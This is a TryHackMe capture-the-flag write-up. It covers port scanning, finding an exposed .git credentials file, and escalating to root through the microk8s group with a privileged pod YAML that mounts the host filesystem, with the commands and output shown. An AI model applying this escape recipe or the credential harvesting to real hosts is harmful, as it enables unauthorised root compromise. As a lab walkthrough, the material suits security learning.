# Frank & Herby make an app — TryHackMe Writeup

**Difficulty:** Medium  
**TL;DR:** Discover hidden files → recover SSH key for `frank` → abuse microk8s-related SUID/config → escalate to root.
---------------------------
## Target
- Machine: `[REDACTED_IP]`  
- Date: `2025-10-14`  
- Environment: TryHackMe / CTF
---------------------------
## Q1-What port has a webpage frank was able to stand up? 

I began with an nmap scan to discover open ports. The default scan revealed only SSH (port 22), so I performed a comprehensive full-port scan to identify all available services.

```bash
 └─$ nmap -sT -T4 -Pn -p- [REDACTED_IP]

22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
10250/tcp open  unknown
10255/tcp open  unknown
10257/tcp open  unknown
10259/tcp open  unknown
25000/tcp open  icl-twobase1
31337/tcp open  http     nginx 1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
|_http-server-header: nginx/1.21.3
32000/tcp open  http     Docker Registry (API: 2.0)
```
the port `[REDACTED]`

-------------------------------------------------------
## Q2-What did frank leave exposed on the site? 

Directory discovery on port `[REDACTED]` :

```bash
└─$ gobuster dir -u http://REDACTED_IP:[REDACTED_PORT]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 40

/assets               (Status: 301) [Size: 169] 
/css                  (Status: 301) [Size: 169]
/vendor               (Status: 301) [Size: 169]

```
403 Forbidden
We cant access to any of this 

-------------

Hint: Frank isn't a normal dev, not the conventional type... so maybe a little variety will 	`git` you there.


I tried some known `.git` files.

We got `.git[REDACTED]` 

We can also use dirseach tool:
```bash
└─$ dirseach -u http://REDACTED_IP:REDACTED_PORT
```
--------------

`http://frank:f[REDACTED]@192.168.100.50`

Decoded by CyberChef :

`http://frank:f[REDACTED]192.168.100.50`

SSH Credentials 

----------------

## user.txt flag

Contact via SSH and get the user.txt :
```bash
└─$ ssh frank@[REDACTED_IP]                

frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)

frank@dev-01:~$ cat user.txt 
THM{[REDACTED]}
```
------------------

## root.txt flag

User frank is not in the sudoers file.

```bash
frank@dev-01:~$ sudo -l
[sudo] password for frank: 
Sorry, user frank may not run sudo on dev-01.
```
Frank in `998(microk8s)` group

------------------------

MicroK8s allowed any user with access to the host to deploy a pod to the underlying Kubernetes installation. This allowed an attacker with local access to provision a privileged container and gain root access to the underlying host.

-----------------------

First i tried to create new Pods but faced internet connectivity issues pulling images.
We can used existing local images instead of downloading new ones.

Found existing local images: `microk8s kubectl get node -o yaml`

Discovered: `localhost:32000/bsnginx@sha256:59dafb4b06387083e51e2589773263ae301fe4285cfa4eb85ec5a3e70323d6bd`

Created a privileged Pod using the local image:

```bash
frank@dev-01:~$ cat local-pod.yaml 

apiVersion: v1
kind: Pod
metadata:
  name: local-priv-pod
spec:
  containers:
  - name: priv-container
    image: localhost:32000/bsnginx:latest
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      privileged: true
      runAsUser: 0
    volumeMounts:
    - name: host-fs
      mountPath: /host
  volumes:
  - name: host-fs
    hostPath:
      path: /
      type: Directory
```

Executed the attack and get the flag:
```bash
frank@dev-01:~$ microk8s kubectl apply -f local-pod.yaml
pod/local-priv-pod created
frank@dev-01:~$ microk8s kubectl get pods 
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          3y352d
local-priv-pod                      1/1     Running   0          15s

frank@dev-01:~$ microk8s kubectl exec -it local-priv-pod -- /bin/bash

root@local-priv-pod:~# cat /host/root/root.txt
THM{[REDACTED]}
```
 
------------------------------------

Note: This writeup is for educational purposes. All sensitive values (IPs, keys, flags) are redacted.

